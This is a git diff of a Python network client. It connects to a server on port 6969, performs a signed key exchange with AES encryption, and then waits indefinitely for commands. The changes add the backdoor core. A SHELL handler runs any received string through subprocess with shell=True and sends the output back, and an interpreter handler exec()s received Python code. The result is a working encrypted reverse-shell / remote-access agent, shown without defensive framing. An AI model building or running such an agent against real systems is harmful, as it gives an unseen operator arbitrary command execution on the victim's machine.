@@ -1,7 +1,11 @@
+import sys
 import time
 import socket
-import select
 import logging
+
+# Modules
+import subprocess
+from io import StringIO
 
 from cryptography import x509
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
@@ -11,6 +15,7 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
 
 logging.basicConfig(level=logging.DEBUG)
+socket.setdefaulttimeout(10)
 
 
 class BaseClient:
@@ -42,11 +47,12 @@ class BaseClient:
                 # Socket is not open
                 continue
             except OSError:
-                logging.debug('Already connected to peer, attempting reconnect')
                 self.sock.close()
                 self.sock = socket.socket()
+                self.sock.settimeout(10)
                 time.sleep(1)
                 continue
+
             try:
                 self.handshake()
             except Exception as error:
@@ -55,7 +61,7 @@ class BaseClient:
                 self.address = address
                 break
 
-    def handshake(self, _blocking: bool = True) -> None:
+    def handshake(self) -> None:
         """
         Handshake 
 
@@ -73,10 +79,10 @@ class BaseClient:
             encoding=serialization.Encoding.PEM, 
             format=serialization.PublicFormat.SubjectPublicKeyInfo
         )
-
-        serialized_peer_public_key = self._read(blocking=_blocking)
-        self._write(pem_public_key, blocking=_blocking)
-        signature = self._read(blocking=_blocking)
+        # Exchange public keys
+        serialized_peer_public_key = self._read()
+        self._write(pem_public_key)
+        signature = self._read()
 
         # Verify signature
         self.certificate.public_key().verify(
@@ -98,7 +104,7 @@ class BaseClient:
         ).derive(shared_key)
 
         # Share IV for AES
-        iv = self._read(blocking=_blocking)
+        iv = self._read()
 
         self.cipher = Cipher(
             algorithm=algorithms.AES256(derived_key),
@@ -130,62 +136,36 @@ class BaseClient:
 
         return unpadded_data
 
-    def __read(self, amount: int, blocking: bool = False) -> bytes:
+    def __read(self, amount: int) -> bytes:
         """ Receive raw data from peer """
-        while True:
-            # Check if socket is readable
-            readable, _, errors = select.select([self.sock], [self.sock], [self.sock])
-            if errors:
-                raise OSError('Could not read from socket: %s' % str(self.address))
-            if readable:
-                # Read of socket
-                data = self.sock.recv(amount)
-                if data:
-                    return data
-                else:
-                    # Assume socket is closed
-                    logging.debug('Assuming socket is closed')
-                    raise ConnectionResetError('Connection closed by peer')
-            # Only run the loop once if blocking is set to False
-            if not blocking:
-                break
+        data = self.sock.recv(amount)
+        if not data:
+            # Assume connection was closed
+            logging.info('Assuming connection was closed: %s' % str(self.address))
+            raise ConnectionResetError
 
-        raise TimeoutError('Could not read from socket: %s' % str(self.address))
+        return data
 
-    def _read(self, blocking: bool = False) -> bytes:
+    def _read(self) -> bytes:
         """ Read messages from client """
-        header = self.__read(self.header_length, blocking=blocking)
+        header = self.__read(self.header_length)
         message_length = int.from_bytes(header, 'big')
-        return self.__read(message_length, blocking=blocking)
+        return self.__read(message_length)
 
-    def _write(self, data: bytes, blocking: bool = False) -> None:
+    def _write(self, data: bytes) -> None:
         """ Write message data to peer """
         # Create header for data
         header = len(data).to_bytes(self.header_length, byteorder='big')
         message = header + data
-        while True:
-            # Check if socket is readable
-            _, writeable, errors = select.select([self.sock], [self.sock], [self.sock])
-            if errors:
-                break
-            if writeable:
-                # Write to socket
-                self.sock.sendall(message)
-                return
+        self.sock.sendall(message)
 
-            # Only run the loop once if blocking is set to False
-            if not blocking:
-                break
-
-        raise OSError('Could not write to socket: %s' % str(self.sock))
-
-    def read(self, blocking: bool = False) -> bytes:
+    def read(self) -> bytes:
         """ Read encrypted messages from peer """
-        return self._decrypt(self._read(blocking=blocking))
+        return self._decrypt(self._read())
 
-    def write(self, data: bytes, blocking: bool = False) -> bool:
+    def write(self, data: bytes) -> bool:
         """ Encrypt and write data to peer """
-        return self._write(self._encrypt(data), blocking=blocking)
+        return self._write(self._encrypt(data))
 
 
 class Client(BaseClient):
@@ -197,7 +177,7 @@ class Client(BaseClient):
     def listen(self) -> None:
         """ Listen for coming commands """
         # Wait for a command to arrive
-        command = self.read(blocking=True).decode()
+        command = self.read().decode()
         match command:
             case 'SHELL':
                 self.shell()
@@ -208,21 +188,43 @@ class Client(BaseClient):
 
     def shell(self) -> None:
         """ Open a shell for peer """
-        command = self.read(blocking=True).decode()
-        logging.debug('Executing shell command: %s' % command)
-        self.write(b'You made it!')
+        command = self.read().decode()
+        logging.info('Executing shell command: %s' % command)
+        execute = lambda command: subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        process = execute(command)
+        self.write(process.stdout.read() + process.stderr.read())
 
     def interpreter(self) -> None:
         """ Open python interpreter for peer """
+        command = self.read().decode()
+        logging.info('Executing python command: %s' % command)
+        error_message = ''
+        # Prepare exec
+        old_stdout = sys.stdout
+        output = sys.stdout = StringIO()
+        try:
+            exec(command)
+        except Exception as error:
+            # Create error message
+            error_message = f'{error.__class__.__name__}: {str(error)}\n'
+        finally:
+            sys.stdout = old_stdout
+
+        self.write((output.getvalue() + error_message).encode())
 
 if __name__ == '__main__':
+
+    # Read certificate from file
     with open('cert.pem', 'rb') as file:
         cert = x509.load_pem_x509_certificate(file.read())
 
+    # Connect to server
     client = Client(cert)
     client.connect(('localhost', 6969))
-    print(client.read(blocking=True))
-    client._write(b'hello lol')
 
+    # Listen to commands indefinitely
     while True:
-        client.listen()
+        try:
+            client.listen()
+        except TimeoutError:
+            continue
